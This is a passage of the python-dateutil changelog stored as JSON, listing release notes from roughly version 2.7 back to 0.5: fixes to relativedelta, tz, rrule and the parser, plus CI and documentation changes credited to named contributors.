Reported by binnisb and pferreir\n  (gh issue 350, pr 472)\n- Fixed relativedelta.weeks property getter and setter to work for both\n  negative and positive values. Reported and fixed by souliane (gh issue 459,\n  pr 460)\n- Fixed issue where passing whole number floats to the months or years\n  arguments of the relativedelta constructor would lead to errors during\n  addition. Reported by arouanet (gh pr 411), fixed by lkollar (gh pr 553)\n- Added a pre-built tz.UTC object representing UTC (gh pr 497)\n- Added a cache to tz.gettz so that by default it will return the same object\n  for identical inputs. This will change the semantics of certain operations\n  between datetimes constructed with tzinfo=tz.gettz(...). (gh pr 628)\n- Changed the behavior of tz.tzutc to return a singleton (gh pr 497, 504)\n- Changed the behavior of tz.tzoffset to return the same object when passed the\n  same inputs, with a corresponding performance improvement (gh pr 504)\n- Changed the behavior of tz.tzstr to return the same object when passed the\n  same inputs. (gh pr 628)\n- Added .instance alternate constructors for tz.tzoffset and tz.tzstr, to\n  allow the construction of a new instance if desired. (gh pr 628)\n- Added the tz.gettz.nocache function to allow explicit retrieval of a new\n  instance of the relevant tzinfo. (gh pr 628)\n- Expand definition of tz.tzlocal equality so that the local zone is allow\n  equality with tzoffset and tzutc. (gh pr 598)\n- Deprecated the idiosyncratic tzstr format mentioned in several examples but\n  evidently designed exclusively for dateutil, and very likely not used by\n  any current users. (gh issue 595, gh pr 606)\n- Added the tz.resolve_imaginary function, which generates a real date from\n  an imaginary one, if necessary. Implemented by Cheukting (gh issue 339,\n  gh pr 607)\n- Fixed issue where the tz.tzstr constructor would erroneously succeed if\n  passed an invalid value for tzstr. Fixed by pablogsal (gh issue 259,\n  gh pr 581)\n- Fixed issue with tz.gettz for TZ variables that start with a colon. Reported\n  and fixed by lapointexavier (gh pr 601)\n- Added a lock to tz.tzical's cache. Reported and fixed by Unrud (gh pr 430)\n- Fixed an issue with fold support on certain Python 3 implementations that\n  used the pre-3.6 pure Python implementation of datetime.replace, most\n  notably pypy3 (gh pr 446).\n- Added support for VALUE=DATE-TIME for DTSTART in rrulestr. Reported by potuz\n  (gh issue 401) and fixed by Unrud (gh pr 429)\n- Started enforcing that within VTIMEZONE, the VALUE parameter can only be\n  omitted or DATE-TIME, per RFC 5545. Reported by Unrud (gh pr 439)\n- Added support for TZID parameter for DTSTART in rrulestr. Reported and\n  fixed by ryanpetrello (gh issue 614, gh pr 624)\n- Added 'RRULE:' prefix to rrule strings generated by rrule.__str__, in\n  compliance with the RFC. Reported by AndrewPashkin (gh issue 86), fixed by\n  jarondl and mlorant (gh pr 450)\n- Switched to setuptools_scm for version management, automatically calculating\n  a version number from the git metadata. Reported by jreback (gh issue 511),\n  implemented by Sulley38 (gh pr 564)\n- Switched setup.py to use find_packages, and started testing against pip\n  installed versions of dateutil in CI. Fixed issue with parser import\n  discovered by jreback in pandas-dev/pandas18141. (gh issue 507, pr 509)\n- Switched test suite to using pytest (gh pr 495)\n- Switched CI over to use tox. Fixed by gaborbernat (gh pr 549)\n- Added a test-only dependency on freezegun. (gh pr 474)\n- Reduced number of CI builds on Appveyor. Fixed by kirit93 (gh issue 529,\n  gh pr 579)\n- Made xfails strict by default, so that an xpass is a failure. (gh pr 567)\n- Added a documentation generation stage to tox and CI. (gh pr 568)\n- Added an explicit warning when running python setup.py explaining how to run\n  the test suites with pytest. Fixed by lkollar. (gh issue 544, gh pr 548)\n- Added requirements-dev.txt for test dependency management (gh pr 499, 516)\n- Fixed code coverage metrics to account for Windows builds (gh pr 526)\n- Fixed code coverage metrics to NOT count xfails. Fixed by gaborbernat\n  (gh issue 519, gh pr 563)\n- Style improvement to zoneinfo.tzfile that was confusing to static type\n  checkers. Reported and fixed by quodlibetor (gh pr 485)\n- Several unused imports were removed by jdufresne. (gh pr 486)\n- Switched ``isinstance(*, collections.Callable)`` to callable, which is available\n  on all supported Python versions. Implemented by jdufresne (gh pr 612)\n- Added CONTRIBUTING.md (gh pr 533)\n- Added AUTHORS.md (gh pr 542)\n- Corrected setup.py metadata to reflect author vs. maintainer, (gh issue 477,\n  gh pr 538)\n- Corrected README to reflect that tests are now run in pytest. Reported and\n  fixed by m-dz (gh issue 556, gh pr 557)\n- Updated all references to RFC 2445 (iCalendar) to point to RFC 5545. Fixed\n  by mariocj89 (gh issue 543, gh pr 555)\n- Corrected parse documentation to reflect proper integer offset units,\n  reported and fixed by abrugh (gh pr 458)\n- Fixed dangling parenthesis in tzoffset documentation (gh pr 461)\n- Started including the license file in wheels. Reported and fixed by\n  jdufresne (gh pr 476)\n- Indentation fixes to parser docstring by jbrockmendel (gh pr 492)\n- Moved many examples from the \"examples\" documentation into their appropriate\n  module documentation pages. Fixed by Tomasz-Kluczkowski and jakec-github\n  (gh pr 558, 561)\n- Fixed documentation so that the parser.isoparse documentation displays.\n  Fixed by alexchamberlain (gh issue 545, gh pr 560)\n- Refactored build and release sections and added setup instructions to\n  CONTRIBUTING. Reported and fixed by kynan (gh pr 562)\n- Cleaned up various dead links in the documentation. (gh pr 602, 608, 618)\n\n", "2.6.1": "=============\n- Updated zoneinfo file to 2017b. (gh pr 395)\n- Added Python 3.6 to CI testing (gh pr 365)\n- Removed duplicate test name that was preventing a test from being run.\n  Reported and fixed by jdufresne (gh pr 371)\n- Fixed testing of folds and gaps, particularly on Windows (gh pr 392)\n- Fixed deprecated escape characters in regular expressions. Reported by\n  nascheme and thierryba (gh issue 361), fixed by thierryba (gh pr 358)\n- Many PEP8 style violations and other code smells were fixed by jdufresne\n  (gh prs 358, 363, 364, 366, 367, 368, 372, 374, 379, 380, 398)\n- Improved performance of tzutc and tzoffset objects. (gh pr 391)\n- Fixed issue with several time zone classes around DST transitions in any\n  zones with +0 standard offset (e.g. Europe/London) (gh issue 321, pr 390)\n- Fixed issue with fuzzy parsing where tokens similar to AM/PM that are in the\n  end skipped were dropped in the fuzzy_with_tokens list. Reported and fixed\n  by jbrockmendel (gh pr 332).\n- Fixed issue with parsing dates of the form X m YY. Reported by jbrockmendel.\n  (gh issue 333, pr 393)\n- Added support for parser weekdays with less than 3 characters. Reported by\n  arcadefoam (gh issue 343), fixed by jonemo (gh pr 382)\n- Fixed issue with the addition and subtraction of certain relativedeltas.\n  Reported and fixed by kootenpv (gh issue 346, pr 347)\n- Fixed issue where the COUNT parameter of rrules was ignored if 0. Fixed by\n  mshenfield (gh pr 330), reported by vaultah (gh issue 329).\n- Updated documentation to include the new tz methods. (gh pr 324)\n- Update documentation to reflect that the parser can raise TypeError, reported\n  and fixed by tomchuk (gh issue 336, pr 337)\n- Fixed an incorrect year in a parser doctest. Fixed by xlotlu (gh pr 357)\n- Moved version information into _version.py and set up the versions more\n  granularly.\n\n", "2.6.0": "=============\n- Added PEP-495-compatible methods to address ambiguous and imaginary dates in\n  time zones in a backwards-compatible way. Ambiguous dates and times can now\n  be safely represented by all dateutil time zones. Many thanks to Alexander\n  Belopolski (abalkin) and Tim Peters tim-one for their inputs on how to\n  address this. Original issues reported by Yupeng and zed (lP: 1390262,\n  gh issues 57, 112, 249, 284, 286, prs 127, 225, 248, 264, 302).\n- Added new methods for working with ambiguous and imaginary dates to the tz\n  module. datetime_ambiguous() determines if a datetime is ambiguous for a given\n  zone and datetime_exists() determines if a datetime exists in a given zone.\n  This works for all fold-aware datetimes, not just those provided by dateutil.\n  (gh issue 253, gh pr 302)\n- Fixed an issue where dst() in Portugal in 1996 was returning the wrong value\n  in tz.tzfile objects. Reported by abalkin (gh issue 128, pr 225)\n- Fixed an issue where zoneinfo.ZoneInfoFile errors were not being properly\n  deep-copied. (gh issue 226, pr 225)\n- Refactored tzwin and tzrange as a subclass of a common class, tzrangebase, as\n  there was substantial overlapping functionality. As part of this change,\n  tzrange and tzstr now expose a transitions() function, which returns the\n  DST on and off transitions for a given year. (gh issue 260, pr 302)\n- Deprecated zoneinfo.gettz() due to confusion with tz.gettz(), in favor of\n  get() method of zoneinfo.ZoneInfoFile objects. (gh issue 11, pr 310)\n- For non-character, non-stream arguments, parser.parse now raises TypeError\n  instead of AttributeError. (gh issues 171, 269, pr 247)\n- Fixed an issue where tzfile objects were not properly handling dst() and\n  tzname() when attached to datetime.time objects. Reported by ovacephaloid.\n  (gh issue 292, pr 309)\n- /usr/share/lib/zoneinfo was added to TZPATHS for compatibility with Solaris\n  systems. Reported by dhduvall (gh issue 276, pr 307)\n- tzoffset and tzrange objects now accept either a number of seconds or a\n  datetime.timedelta() object wherever previously only a number of seconds was\n  allowed. (gh pr 264, 277)\n- datetime.timedelta objects can now be added to relativedelta objects. Reported\n  and added by Alec Nikolas Reiter (justanr) (gh issue 282, pr 283\n- Refactored relativedelta.weekday and rrule.weekday into a common base class\n  to reduce code duplication. (gh issue 140, pr 311)\n- An issue where the WKST parameter was improperly rendering in str(rrule) was\n  reported and fixed by Daniel LePage (dplepage). (gh issue 262, pr 263)\n- A replace() method has been added to rrule objects by jendas1, which creates\n  new rrule with modified attributes, analogous to datetime.replace (gh pr 167)\n- Made some significant performance improvements to rrule objects in Python 2.x\n  (gh pr 245)\n- All classes defining equality functions now return NotImplemented when\n  compared to unsupported classes, rather than raising TypeError, to allow other\n  classes to provide fallback support. (gh pr 236)\n- Several classes have been marked as explicitly unhashable to maintain\n  identical behavior between Python 2 and 3. Submitted by Roy Williams\n  (rowillia) (gh pr 296)\n- Trailing whitespace in easter.py has been removed. Submitted by OmgImAlexis\n  (gh pr 299)\n- Windows-only batch files in build scripts had line endings switched to CRLF.\n  (gh pr 237)\n- adamchainz updated the documentation links to reflect that the canonical\n  location for readthedocs links is now at .io, not .org. (gh pr 272)\n- Made some changes to the CI and codecov to test against newer versions of\n  Python and pypy, and to adjust the code coverage requirements. For the moment,\n  full pypy3 compatibility is not supported until a new release is available,\n  due to upstream bugs in the old version affecting PEP-495 support.\n  (gh prs 265, 266, 304, 308)\n- The full PGP signing key fingerprint was added to the README.md in favor of\n  the previously used long-id. Reported by valholl (gh issue 287, pr 304)\n- Updated zoneinfo to 2016i. (gh issue 298, gh pr 306)\n\n\n", "2.5.3": "=============\n- Updated zoneinfo to 2016d\n- Fixed parser bug where unambiguous datetimes fail to parse when dayfirst is\n  set to true. (gh issue 233, pr 234)\n- Bug in zoneinfo file on platforms such as Google App Engine which do not\n  do not allow importing of subprocess.check_call was reported and fixed by\n  savraj (gh issue 239, gh pr 240)\n- Fixed incorrect version in documentation (gh issue 235, pr 243)\n\n", "2.5.2": "=============\n- Updated zoneinfo to 2016c\n- Fixed parser bug where yearfirst and dayfirst parameters were not being\n  respected when no separator was present. (gh issue 81 and 217, pr 229)\n\n", "2.5.1": "=============\n- Updated zoneinfo to 2016b\n- Changed MANIFEST.in to explicitly include test suite in source distributions,\n  with help from koobs (gh issue 193, pr 194, 201, 221)\n- Explicitly set all line-endings to LF, except for the NEWS file, on a\n  per-repository basis (gh pr 218)\n- Fixed an issue with improper caching behavior in rruleset objects (gh issue\n  104, pr 207)\n- Changed to an explicit error when rrulestr strings contain a missing BYDAY\n  (gh issue 162, pr 211)\n- tzfile now correctly handles files containing leapcnt (although the leapcnt\n  information is not actually used). Contributed by hjoukl (gh issue 146, pr\n  147)\n- Fixed recursive import issue with tz module (gh pr 204)\n- Added compatibility between tzwin objects and datetime.time objects (gh issue\n  216, gh pr 219)\n- Refactored monolithic test suite by module (gh issue 61, pr 200 and 206)\n- Improved test coverage in the relativedelta module (gh pr 215)\n- Adjusted documentation to reflect possibly counter-intuitive properties of\n  RFC-5545-compliant rrules, and other documentation improvements in the rrule\n  module (gh issue 105, gh issue 149 - pointer to the solution by phep,\n  pr 213).\n\n\n", "2.5.0": "=============\n- Updated zoneinfo to 2016a\n- zoneinfo_metadata file version increased to 2.0 - the updated updatezinfo.py\n  script will work with older zoneinfo_metadata.json files, but new metadata\n  files will not work with older updatezinfo.py versions. Additionally, we have\n  started hosting our own mirror of the Olson databases on a GitHub pages\n  site (https://dateutil.github.io/tzdata/) (gh pr #183)\n- dateutil zoneinfo tarballs now contain the full zoneinfo_metadata file used\n  to generate them. (gh issue 27, gh pr 85)\n- relativedelta can now be safely subclassed without derived objects reverting\n  to base relativedelta objects as a result of arithmetic operations.\n  (lp:1010199, gh issue 44, pr 49)\n- relativedelta 'weeks' parameter can now be set and retrieved as a property of\n  relativedelta instances. (lp: 727525, gh issue 45, pr 49)\n- relativedelta now explicitly supports fractional relative weeks, days, hours,\n  minutes and seconds. Fractional values in absolute parameters (year, day, etc)\n  are now deprecated. (gh issue 40, pr 190)\n- relativedelta objects previously did not use microseconds to determine of two\n  relativedelta objects were equal. This oversight has been corrected.\n  Contributed by elprans (gh pr 113)\n- rrule now has an xafter() method for retrieving multiple recurrences after a\n  specified date. (gh pr 38)\n- str(rrule) now returns an RFC2445-compliant rrule string, contributed by\n  schinckel and armicron (lp:1406305, gh issue 47, prs 50, 62 and 160)\n- rrule performance under certain conditions has been significantly improved\n  thanks to a patch contributed by dekoza, based on an article by Brian Beck\n  (exogen) (gh pr 136)\n- The use of both the 'until' and 'count' parameters is now deprecated as\n  inconsistent with RFC2445 (gh pr 62, 185)\n- Parsing an empty string will now raise a ValueError, rather than returning the\n  datetime passed to the 'default' parameter. (gh issue 78, pr 187)\n- tzwinlocal objects now have a meaningful repr() and str() implementation\n  (gh issue 148, prs 184 and 186)\n- Added equality logic for tzwin and tzwinlocal objects. (gh issue 151,\n  pr 180, 184)\n- Added some flexibility in subclassing timelex, and switched the default\n  behavior over to using string methods rather than comparing against a fixed\n  list. (gh pr 122, 139)\n- An issue causing tzstr() to crash on Python 2.x was fixed. (lp: 1331576,\n  gh issue 51, pr 55)\n- An issue with string encoding causing exceptions under certain circumstances\n  when tzname() is called was fixed. (gh issue 60, 74, pr 75)\n- Parser issue where calling parse() on dates with no day specified when the\n  day of the month in the default datetime (which is \"today\" if unspecified) is\n  greater than the number of days in the parsed month was fixed (this issue\n  tended to crop up between the 29th and 31st of the month, for obvious reasons)\n  (canonical gh issue 25, pr 30, 191)\n- Fixed parser issue causing fuzzy_with_tokens to raise an unexpected exception\n  in certain circumstances. Contributed by MichaelAquilina (gh pr 91)\n- Fixed parser issue where years > 100 AD were incorrectly parsed. Contributed\n  by Bachmann1234 (gh pr 130)\n- Fixed parser issue where commas were not a valid separator between seconds\n  and microseconds, preventing parsing of ISO 8601 dates. Contributed by\n  ryanss (gh issue 28, pr 106)\n- Fixed issue with tzwin encoding in locales with non-Latin alphabets\n  (gh issue 92, pr 98)\n- Fixed an issue where tzwin was not being properly imported on Windows.\n  Contributed by labrys. (gh pr 134)\n- Fixed a problem causing issues importing zoneinfo in certain circumstances.\n  Issue and solution contributed by alexxv (gh issue 97, pr 99)\n- Fixed an issue where dateutil timezones were not compatible with basic time\n  objects. One of many, many timezone related issues contributed and tested by\n  labrys. (gh issue 132, pr 181)\n- Fixed issue where tzwinlocal had an invalid utcoffset. (gh issue 135,\n  pr 141, 142)\n- Fixed issue with tzwin and tzwinlocal where DST transitions were incorrectly\n  parsed from the registry. (gh issue 143, pr 178)\n- updatezinfo.py no longer suppresses certain OSErrors. Contributed by bjamesv\n  (gh pr 164)\n- An issue that arose when timezone locale changes during runtime has been\n  fixed by carlosxl and mjschultz (gh issue 100, prs 107, 109)\n- Python 3.5 was added to the supported platforms in the metadata (tacaswell\n  gh pr 159) and the test suites (moreati gh pr 117).\n- An issue with tox failing without unittest2 installed in Python 2.6 was fixed\n  by moreati (gh pr 115)\n- Several deprecated functions were replaced in the tests by moreati\n  (gh pr 116)\n- Improved the logic in Travis and Appveyor to alleviate issues where builds\n  were failing due to connection issues when downloading the IANA timezone\n  files. In addition to adding our own mirror for the files (gh pr 183), the\n  download is now retried a number of times (with a delay) (gh pr 177)\n- Many failing doctests were fixed by moreati. (gh pr 120)\n- Many fixes to the documentation (gh pr 103, gh pr 87 from radarhere,\n  gh pr 154 from gpoesia, gh pr 156 from awsum, gh pr 168 from ja8zyjits)\n- Added a code coverage tool to the CI to help improve the library. (gh pr 182)\n- We now have a mailing list - dateutilpython.org, graciously hosted by\n  Python.org.\n\n\n", "2.4.2": "=============\n- Updated zoneinfo to 2015b.\n- Fixed issue with parsing of tzstr on Python 2.7.x; tzstr will now be decoded\n  if not a unicode type. gh 51 (lp:1331576), gh pr 55.\n- Fix a parser issue where AM and PM tokens were showing up in fuzzy date\n  stamps, triggering inappropriate errors. gh 56 (lp: 1428895), gh pr 63.\n- Missing function \"setcachesize\" removed from zoneinfo __all__ list by ryanss,\n  fixing an issue with wildcard imports of dateutil.zoneinfo. (gh pr 66).\n- (PyPI only) Fix an issue with source distributions not including the test\n  suite.\n\n\n", "2.4.1": "=============\n\n- Added explicit check for valid hours if AM/PM is specified in parser.\n  (gh pr 22, issue 21)\n- Fix bug in rrule introduced in 2.4.0 where byweekday parameter was not\n  handled properly. (gh pr 35, issue 34)\n- Fix error where parser allowed some invalid dates, overwriting existing hours\n  with the last 2-digit number in the string. (gh pr 32, issue 31)\n- Fix and add test for Python 2.x compatibility with boolean checking of\n  relativedelta objects. Implemented by nimasmi (gh pr 43) and C\u00e9dric Krier\n  (lp: 1035038)\n- Replaced parse() calls with explicit datetime objects in unit tests unrelated\n  to parser. (gh pr 36)\n- Changed private _byxxx from sets to sorted tuples and fixed one currently\n  unreachable bug in _construct_byset. (gh pr 54)\n- Additional documentation for parser (gh pr 29, 33, 41) and rrule.\n- Formatting fixes to documentation of rrule and README.rst.\n- Updated zoneinfo to 2015a.\n\n", "2.4.0": "=============\n\n- Fix an issue with relativedelta and freezegun (lp:1374022)\n- Fix tzinfo in windows for timezones without dst (lp:1010050, gh 2)\n- Ignore missing timezones in windows like in POSIX\n- Fix minimal version requirement for six (gh 6)\n- Many rrule changes and fixes by pganssle (gh pull requests 13 14 17),\n    including defusing some infinite loops (gh 4)\n\n", "2.3": "===========\n\n- Cleanup directory structure, moved test.py to dateutil/tests/test.py\n\n- Changed many aspects of dealing with the zone info file. Instead of a cache,\n  all the zones are loaded to memory, but symbolic links are loaded only once,\n  so not much memory is used.\n\n- The package is now zip-safe, and universal-wheelable, thanks to changes in\n  the handling of the zoneinfo file.\n\n- Fixed tzwin silently not imported on windows python2\n\n- New maintainer, together with new hosting: GitHub, Travis, Read-The-Docs\n\n", "2.2": "===========\n\n- Updated zoneinfo to 2013h\n\n- fuzzy_with_tokens parse addon from Christopher Corley\n\n- Bug with LANG=C fixed by Mike Gilbert\n\n", "2.1": "===========\n\n- New maintainer\n\n- Dateutil now works on Python 2.6, 2.7 and 3.2 from same codebase (with six)\n\n- 704047: Ismael Carnales' patch for a new time format\n\n- Small bug fixes, thanks for reporters!\n\n\n", "2.0": "===========\n\n- Ported to Python 3, by Brian Jones.  If you need dateutil for Python 2.X,\n  please continue using the 1.X series.\n\n- There's no such thing as a \"PSF License\".  This source code is now\n  made available under the Simplified BSD license.  See LICENSE for\n  details.\n\n", "1.5": "===========\n\n- As reported by Mathieu Bridon, rrules were matching the bysecond rules\n  incorrectly against byminute in some circumstances when the SECONDLY\n  frequency was in use, due to a copy & paste bug.  The problem has been\n  unittested and corrected.\n\n- Adam Ryan reported a problem in the relativedelta implementation which\n  affected the yearday parameter in the month of January specifically.\n  This has been unittested and fixed.\n\n- Updated timezone information.\n\n\n", "1.4.1": "=============\n\n- Updated timezone information.\n\n\n", "1.4": "===========\n\n- Fixed another parser precision problem on conversion of decimal seconds\n  to microseconds, as reported by Erik Brown.  Now these issues are gone\n  for real since it's not using floating point arithmetic anymore.\n\n- Fixed case where tzrange.utcoffset and tzrange.dst() might fail due\n  to a date being used where a datetime was expected (reported and fixed\n  by Lennart Regebro).\n\n- Prevent tzstr from introducing daylight timings in strings that didn't\n  specify them (reported by Lennart Regebro).\n\n- Calls like gettz(\"GMT+3\") and gettz(\"UTC-2\") will now return the\n  expected values, instead of the TZ variable behavior.\n\n- Fixed DST signal handling in zoneinfo files.  Reported by\n  Nicholas F. Fabry and John-Mark Gurney.\n\n\n", "1.3": "===========\n\n- Fixed precision problem on conversion of decimal seconds to\n  microseconds, as reported by Skip Montanaro.\n\n- Fixed bug in constructor of parser, and converted parser classes to\n  new-style classes.  Original report and patch by Michael Elsd\u00f6rfer.\n\n- Initialize tzid and comps in tz.py, to prevent the code from ever\n  raising a NameError (even with broken files).  Johan Dahlin suggested\n  the fix after a pyflakes run.\n\n- Version is now published in dateutil.__version__, as requested\n  by Darren Dale.\n\n- All code is compatible with new-style division.\n\n\n", "1.2": "===========\n\n- Now tzfile will round timezones to full-minutes if necessary,\n  since Python's datetime doesn't support sub-minute offsets.\n  Thanks to Ilpo Nyyss\u00f6nen for reporting the issue.\n\n- Removed bare string exceptions, as reported and fixed by\n  Wilfredo S\u00e1nchez Vega.\n\n- Fix bug in leap count parsing (reported and fixed by Eugene Oden).\n\n\n", "1.1": "===========\n\n- Fixed rrule byyearday handling. Abramo Bagnara pointed out that\n  RFC2445 allows negative numbers.\n\n- Fixed --prefix handling in setup.py (by Sidnei da Silva).\n\n- Now tz.gettz() returns a tzlocal instance when not given any\n  arguments and no other timezone information is found.\n\n- Updating timezone information to version 2005q.\n\n\n", "1.0": "===========\n\n- Fixed parsing of XXhXXm formatted time after day/month/year\n  has been parsed.\n\n- Added patch by Jeffrey Harris optimizing rrule.__contains__.\n\n\n", "0.9": "===========\n\n- Fixed pickling of timezone types, as reported by\n  Andreas K\u00f6hler.\n\n- Implemented internal timezone information with binary\n  timezone files. datautil.tz.gettz() function will now\n  try to use the system timezone files, and fallback to\n  the internal versions. It's also possible to ask for\n  the internal versions directly by using\n  dateutil.zoneinfo.gettz().\n\n- New tzwin timezone type, allowing access to Windows\n  internal timezones (contributed by Jeffrey Harris).\n\n- Fixed parsing of unicode date strings.\n\n- Accept parserinfo instances as the parser constructor\n  parameter, besides parserinfo (sub)classes.\n\n- Changed weekday to spell the not-set n value as None\n  instead of 0.\n\n- Fixed other reported bugs.\n\n\n", "0.5": "===========\n\n- Removed ``FREQ_`` prefix from rrule frequency constants\n  WARNING: this breaks compatibility with previous versions.\n\n- Fixed rrule.between() for cases where \"after\" is achieved\n  before even starting, as reported by Andreas K\u00f6hler.\n\n- Fixed two digit zero-year parsing (such as 31-Dec-00), as\n  reported by Jim Abramson, and included test case for this.\n\n- Sort exdate and rdate before iterating over them, so that\n  it's not necessary to sort them before adding to the rruleset,\n  as reported by Nicholas Piper.\n"}}]